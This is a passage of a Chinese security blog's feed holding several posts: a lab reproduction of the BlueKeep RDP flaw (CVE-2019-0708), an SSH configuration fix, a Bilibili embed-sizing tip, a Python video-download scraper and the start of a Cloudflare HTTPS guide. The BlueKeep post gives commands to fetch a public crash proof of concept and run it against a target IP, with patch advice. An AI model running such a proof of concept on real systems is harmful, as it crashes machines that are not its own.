class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 实例 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 电影 </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞复现 CVE 2019-0708】17年的勒索病毒又双叕卷土重来了？</title>
      <link href="//190615-013724.html"/>
      <url>//190615-013724.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><blockquote><p>2019年5月14日微软官方发布安全补丁，修复了Windows远程桌面服务的远程代码执行漏洞，该漏洞影响了某些旧版本的Windows系统。此漏洞是预身份验证且无需用户交互，这就意味着这个漏洞可以通过网络蠕虫的方式被利用。利用此漏洞的任何恶意软件都可能从被感染的计算机传播到其他易受攻击的计算机，其方式与2017年WannaCry恶意软件的传播方式类似。</p></blockquote><p>以上内容来自360网络安全响应中心。<br>从微软官方的消息一出，各大安全厂商都开始发布了漏洞预警，那段时间我也一直在找对应的POC，但要不就是不能利用的POC，要不就是利用以前漏洞写的POC，更有甚着点击attack后给你惊喜。</p><a id="more"></a><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/2019-07081.gif?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>看到这个图片的时候，真的一副生无可恋的样子，随着时间推移，渐渐的也就不怎么关注这个漏洞了。<br>直到今天，看到网上有人发一些关于这个漏洞的利用复现视频的时候，才意识到已经过去正好一个月的，此时POC也早就被公布了。<br>早在在5月31日的时候，n1xbyte就在Github上发布了利用该漏洞导致系统蓝屏的可用POC ,所以我们来复现看看吧。</p><h1 id="0x01-下载POC"><a href="#0x01-下载POC" class="headerlink" title="0x01 下载POC"></a>0x01 下载POC</h1><p>首先git clone代码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/n1xbyte/CVE-2019-0708.git<span class="token builtin class-name">cd</span> CVE-2019-0708<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/2019-07082.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x02-开始复现"><a href="#0x02-开始复现" class="headerlink" title="0x02 开始复现"></a>0x02 开始复现</h1><p>1、为了顺利复现成功，需要将被攻击机的远程桌面设为允许，防火墙也需要关掉。<br>2、被攻击机的IP地址与操作系统信息如下：</p><pre class="line-numbers language-none"><code class="language-none">#被攻击主机ip地址：192.168.1.106系统类型：64位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>3、安装需要的库后执行POC</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip3 <span class="token function">install</span> impacketpython3 crashpoc.py <span class="token number">192.168</span>.1.106 <span class="token number">64</span>  <span class="token comment">#python3 crashpoc.py ip地址 系统类型</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/2019-07083.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>POC被成功被执行，虽然现阶段只是让目标蓝屏，但是对这个漏洞的利用手段绝对不会止步于此。</p><h1 id="0x03-修复方案"><a href="#0x03-修复方案" class="headerlink" title="0x03 修复方案"></a>0x03 修复方案</h1><p>1、最简便的方法就是安装一个安全管家，比如火绒、360之类的<br>2、把系统的自动更新打开或者到微软官网<a href="https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2019-0708">下载补丁</a><br>3、把自己电脑上的远程桌面关掉、防火墙开启</p><h1 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h1><p>总是有人说没有绝对的安全，当然事实也确实是如此，但是只要我们平时养成一个良好的安全习惯，还是可以避免很多病毒木马的侵害的，毕竟很多的恶意程序都是广撒网，捕的鱼多不多就是另一回事儿了。</p><p><strong>最后再次强调，不得将本文用作违法犯罪目的，本文只用作技术分享交流学习使用。</strong></p><p>下面为视频演示：</p><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=55626994&cid=97251766&page=1" " scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"> </iframe></div><p>如果视频不能全屏播放，请点击<a href="https://www.bilibili.com/video/av55626994/" title="视频地址">视频地址</a>进行观看。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> CVE 2019-0708 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对于连接ssh时连时断的解决方法</title>
      <link href="//190614-134948.html"/>
      <url>//190614-134948.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近用ssh连接VPS的时候，发生了很诡异的事件，有时能够连接上ssh，有时就死活连接不上，重新安装、公钥私钥都检查了，各种权限也都没有问题，端口监听地址什么的也都配置正常，总之能想到的办法都想过了，此时连不连的上仿佛就要看脸了，下面记录一下最终的解决办法。</p><a id="more"></a><h1 id="0x01-修改配置文件"><a href="#0x01-修改配置文件" class="headerlink" title="0x01 修改配置文件"></a>0x01 修改配置文件</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/ssh/sshd_config<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在配置文件中加入以下内容：</p><pre class="line-numbers language-none"><code class="language-none">UseDNS no<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后重启ssh即可</p><pre class="line-numbers language-none"><code class="language-none">#Ubuntu:service sshd restart 或者 &#x2F;etc&#x2F;init.d&#x2F;sshd restart#Centos7:systemctl restart sshd.service#Centos7以下版本：service sshd restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-原因"><a href="#0x02-原因" class="headerlink" title="0x02 原因"></a>0x02 原因</h1><p>以下解释来自本文方法参考文章：<a href="https://m.ancii.com/ayew4gv3/">文章地址</a></p><blockquote><p>ssh登录服务器时总是要停顿等待一下才能连接上,这是因为OpenSSH服务器有一个DNS查找选项UseDNS默认是打开的。<br>UseDNS选项打开状态下,当客户端试图登录OpenSSH服务器时,服务器端先根据客户端的IP地址进行DNS PTR反向查询,查询出客户端的host name，然后根据查询出的客户端host name进行DNS 正向A记录查询，验证与其原始IP地址是否一致，这是防止客户端欺骗的一种手段,但一般我们的IP是动态的，不会有PTR记录的，打开这个选项不过是在白白浪费时间而已。</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 经验总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解决方案 </tag>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo自适应BiliBili视频大小的解决方案</title>
      <link href="//190614-111512.html"/>
      <url>//190614-111512.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-未修改"><a href="#0x00-未修改" class="headerlink" title="0x00 未修改"></a>0x00 未修改</h1><a id="more"></a><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>//player.bilibili.com/player.html?aid=55224540&amp;cid=96981660&amp;page=1<span class="token punctuation">"</span></span> <span class="token attr-name">scrolling</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>no<span class="token punctuation">"</span></span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">frameborder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>no<span class="token punctuation">"</span></span> <span class="token attr-name">framespacing</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">allowfullscreen</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接将B站中的视频插入地址放入文章MarkDown中的效果如下：</p><iframe src="//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>  <p>这个视频也太小了，而且不能全屏，很难受，于是在网上看到有人用自定义调节视频的高宽。</p><h1 id="0x01-自定义高宽"><a href="#0x01-自定义高宽" class="headerlink" title="0x01 自定义高宽"></a>0x01 自定义高宽</h1><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>//player.bilibili.com/player.html?aid=55224540&amp;cid=96981660&amp;page=1<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>780<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>480<span class="token punctuation">"</span></span> <span class="token attr-name">scrolling</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>no<span class="token punctuation">"</span></span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">frameborder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>no<span class="token punctuation">"</span></span> <span class="token attr-name">framespacing</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">allowfullscreen</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就是在原来的基础上加入了宽高，效果类似这样：</p><iframe src="//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1" width="780" height="480" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>  <p>自定义调节视频高宽虽然可以解决这个问题，但是手机上又是另一翻景象，你看：  </p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>这就更难受了，于是在网上找遍各种自适应视频大小的方案，最终找到以下这种方案。</p><h1 id="0x02-自适应视频大小"><a href="#0x02-自适应视频大小" class="headerlink" title="0x02 自适应视频大小"></a>0x02 自适应视频大小</h1><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span> <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span> <span class="token property">height</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span> <span class="token property">padding-bottom</span><span class="token punctuation">:</span> 75%<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>//player.bilibili.com/player.html?aid=55224540&amp;cid=96981660&amp;page=1<span class="token punctuation">"</span></span> <span class="token attr-name">scrolling</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>no<span class="token punctuation">"</span></span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">frameborder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>no<span class="token punctuation">"</span></span> <span class="token attr-name">framespacing</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">allowfullscreen</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span> <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span> <span class="token property">height</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span> <span class="token property">left</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span> <span class="token property">top</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>只需要把你的视频地址和上面的视频地址替换一下就行，最后效果如下：</p><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"> </iframe></div>  <p>手机上也能很好的自适应：   </p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>不过发现依然不能全屏播放，还是有些美中不足，所以只好也将视频播放链接放到视频下面了，如果不能全屏就只能去源链接去看了，如果你有更好的解决方法，欢迎下方留言。</p><h1 id="0x03-致谢"><a href="#0x03-致谢" class="headerlink" title="0x03 致谢"></a>0x03 致谢</h1><p>本文中的自适应解决方案来自这篇文章：<a href="https://www.andyvj.com/2019/02/12/190213-01/">文章地址</a>，里面还介绍了其他音视频平台插入的方法，在这里也谢谢这位老哥了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 经验总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BiliBili </tag>
            
            <tag> 自适应视频大小 </tag>
            
            <tag> 解决方案 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python实例】批量下载斗罗大陆高清视频</title>
      <link href="//190613-191825.html"/>
      <url>//190613-191825.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-下载视频下载脚本"><a href="#0x00-下载视频下载脚本" class="headerlink" title="0x00 下载视频下载脚本"></a>0x00 下载视频下载脚本</h1><p>首先来到我的<a href="http://www.github.com/teamssix/">Github主页</a>，找到Douluo-download项目，点开找到<a href="https://github.com/teamssix/Douluo-download.git">下载地址</a>，使用git clone对其进行下载</p><a id="more"></a><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/teamssix/Douluo-download.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/douluo1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x01-安装python所需要的库"><a href="#0x01-安装python所需要的库" class="headerlink" title="0x01 安装python所需要的库"></a>0x01 安装python所需要的库</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> Douluo-download/pip3 <span class="token function">install</span> -r requirements.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/douluo2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x02-执行Python程序"><a href="#0x02-执行Python程序" class="headerlink" title="0x02 执行Python程序"></a>0x02 执行Python程序</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 douluo.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/douluo3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>程序在执行的时候会感觉比较慢，其实不是卡了，而是程序正在下载视频，当下载好一个视频才会弹出一条信息。</p><h1 id="0x03-查看成果"><a href="#0x03-查看成果" class="headerlink" title="0x03 查看成果"></a>0x03 查看成果</h1><p>执行ls命令可以看到刚才下载的视频<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/douluo4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>播放看看能不能正常播放<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/douluo5.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>可以看到是可以正常播放的，不过我想试试最新的一集，也就是看看需要会员的视频能不能下载下来，当前最新的一集是55集，那我们下载试试。</p><h1 id="0x04-继续尝试下载VIP视频"><a href="#0x04-继续尝试下载VIP视频" class="headerlink" title="0x04 继续尝试下载VIP视频"></a>0x04 继续尝试下载VIP视频</h1><p>知道下载那一集后还需要修改一下代码才行，将原来下载视频的代码简单做一下修改就行<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/douluo6.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>执行看看<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/douluo7.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>看来不行，只能下载到预告片，接下来就对代码就行简单的介绍吧</p><h1 id="0x05-代码简单介绍"><a href="#0x05-代码简单介绍" class="headerlink" title="0x05 代码简单介绍"></a>0x05 代码简单介绍</h1><h2 id="1、第一部分：导入库设定变量"><a href="#1、第一部分：导入库设定变量" class="headerlink" title="1、第一部分：导入库设定变量"></a>1、第一部分：导入库设定变量</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#导入库设定变量</span><span class="token keyword">import</span> os<span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoupheaders <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36'</span><span class="token punctuation">&#125;</span>home_url <span class="token operator">=</span><span class="token string">'https://v.qq.com/x/cover/m441e3rjq9kwpsc/m00253deqqo.html'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这部分就是导入一些库和一些设定的变量什么的，比如headers、url什么的，没什么好说的</p><h2 id="2、第二部分：爬取每个视频的id"><a href="#2、第二部分：爬取每个视频的id" class="headerlink" title="2、第二部分：爬取每个视频的id"></a>2、第二部分：爬取每个视频的id</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#爬取每个视频的id</span>douluohome <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>home_url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>douluohome<span class="token punctuation">.</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span>douluosoup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>douluohome<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>douluolist <span class="token operator">=</span> douluosoup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'.mod_episode'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里用到了BeautifulSoup4库，先requets获取页面信息，用BeautifulSoup4去对页面html进行解析，最后找到我们想要的东西，这里是清洗出每个视频的ID</p><h2 id="3、第三部分：合成下载链接"><a href="#3、第三部分：合成下载链接" class="headerlink" title="3、第三部分：合成下载链接"></a>3、第三部分：合成下载链接</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#合成下载链接</span>lists <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>douluolist<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    lists<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'https://v.qq.com'</span><span class="token operator">+</span>douluolist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'href'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>很简单的一个处理，将上一步获取的视频的id加到v.qq.com后面，生成视频的播放链接</p><h2 id="4、第四部分：开始下载视频"><a href="#4、第四部分：开始下载视频" class="headerlink" title="4、第四部分：开始下载视频"></a>4、第四部分：开始下载视频</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#开始下载视频</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>lists<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'you-get &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>lists<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#视频会下载到当前目录</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这部分其实也没有什么东西，有了每个视频的播放链接后，直接使用工具就可以下载了，这里使用的是利用os库调用you-get命令进行下载的，最后将you-get命令的显示结果传回终端。</p><h1 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h1><p>总的说来，其实Python主要就是起到爬虫作用，爬取每个视频的播放链接，最后使用you-get对视频进行下载，没有什么太大的难度，所以权当练练手了。</p><p>下面为视频演示：</p><!--<iframe src="//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>--><!--<p align = "center"><iframe height=auto width=100% src="//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1"></iframe></p>--><!--<iframe src="//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1" width="780" height="480" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>--><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=55224540&cid=96981660&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"> </iframe></div><p>如果视频不能全屏播放，请点击<a href="https://www.bilibili.com/video/av55224540/" title="源链接">源链接</a>观看。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 实例 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 斗罗大陆 </tag>
            
            <tag> GitHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为自定义域名的Hexo博客升级到Https网站</title>
      <link href="//191612-123700.html"/>
      <url>//191612-123700.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>一把小绿锁，增加安全与安全感。cloudflare 是一家国外的CDN加速服务商，我们可以用它来把我们的网站升级到https，同时还能够提高网站的访问速度。<br>如果在设置的过程中，因为网站太多英文而困扰，可以利用浏览器的一些插件进行翻译，比如Chrome自带的翻译。<br>我使用的域名提供商是namesilo，博客工具是hexo，在网上找到很多教程都是用的Github官方提供的升级到https的教程，要不就是各种命令，然后按照教程去配置就各种依赖报错，十分心累。<br>本文配置过程中，没有涉及到命令的地方，利用CloudFlare配置https，整体体验还是很是很不错的，而且还能一定程度上的伪装自己的真实IP地址，废话不多说，下面就开整吧。</p><a id="more"></a><h1 id="0x01-注册CloudFlare"><a href="#0x01-注册CloudFlare" class="headerlink" title="0x01 注册CloudFlare"></a>0x01 注册<strong>CloudFlare</strong></h1><p>打开注册地址<a href="https://dash.cloudflare.com/sign-up">https://dash.cloudflare.com/sign-up</a>，输入邮箱和密码，对于下面是否接收广告的选项我是取消勾选，可以自行选择，勾选了平时邮箱会接收到来自CloudFlare的广告。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>此时邮箱会收到验证邮件，点击Verify 